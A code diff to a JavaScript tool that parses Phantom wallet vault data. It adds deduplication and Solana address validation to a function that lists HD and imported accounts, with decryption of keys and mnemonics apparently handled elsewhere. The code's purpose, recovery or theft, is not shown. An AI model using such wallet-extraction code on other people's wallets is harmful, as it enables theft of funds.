@@ -140,6 +140,7 @@ function deriveSolanaKeypairFromMnemonic(mnemonic, accountIndex = 0) {
 
 async function extractWalletAddresses(walletData, password) {
   const wallets = [];
+  const seenAddresses = new Set();
 
   try {
     // Step 1: Get the vault accounts (NOT encrypted in newer Phantom versions)
@@ -158,38 +159,48 @@ async function extractWalletAddresses(walletData, password) {
       try {
         // Check account type
         if (account.type === 'seed') {
-          // HD Wallet - check for Solana chain
+          // HD Wallet - check for Solana chain ONLY
           if (account.chains && account.chains.solana) {
             const solanaPublicKey = account.chains.solana.publicKey;
 
-            if (solanaPublicKey) {
+            // Validate it's a Solana address (base58, typically 32-44 chars, no 0x prefix)
+            if (solanaPublicKey && !solanaPublicKey.startsWith('0x') && solanaPublicKey.length >= 32 && solanaPublicKey.length <= 44) {
+              if (!seenAddresses.has(solanaPublicKey)) {
+                seenAddresses.add(solanaPublicKey);
+                wallets.push({
+                  type: 'HD Wallet',
+                  address: solanaPublicKey,
+                  index: accountIndex,
+                  derivationIndex: account.derivationIndex || 0,
+                  seedIdentifier: account.seedIdentifier,
+                  privateKey: null, // Encrypted - needs password
+                  mnemonic: null // Encrypted - needs password
+                });
+              }
+            }
+          }
+          // Skip EVM chains from Phantom (account.chains.ethereum, etc.)
+        } else if (account.type === 'privateKey' && account.chainType === 'solana') {
+          // Imported Solana account - must be explicitly chainType: 'solana'
+          const publicKey = account.publicKey;
+
+          // Validate it's a Solana address
+          if (publicKey && !publicKey.startsWith('0x') && publicKey.length >= 32 && publicKey.length <= 44) {
+            if (!seenAddresses.has(publicKey)) {
+              seenAddresses.add(publicKey);
               wallets.push({
-                type: 'HD Wallet',
-                address: solanaPublicKey,
+                type: 'Imported Account',
+                address: publicKey,
                 index: accountIndex,
-                derivationIndex: account.derivationIndex || 0,
-                seedIdentifier: account.seedIdentifier,
+                privateKeyIdentifier: account.privateKeyIdentifier,
+                identifier: account.identifier,
                 privateKey: null, // Encrypted - needs password
-                mnemonic: null // Encrypted - needs password
+                mnemonic: null
               });
             }
           }
-        } else if (account.type === 'privateKey' && account.chainType === 'solana') {
-          // Imported Solana account
-          const publicKey = account.publicKey;
-
-          if (publicKey) {
-            wallets.push({
-              type: 'Imported Account',
-              address: publicKey,
-              index: accountIndex,
-              privateKeyIdentifier: account.privateKeyIdentifier,
-              identifier: account.identifier,
-              privateKey: null, // Encrypted - needs password
-              mnemonic: null
-            });
-          }
         }
+        // Ignore any other account types (EVM accounts in Phantom)
       } catch (error) {
         console.error(`  Error processing account ${accountIndex}:`, error.message);
       }
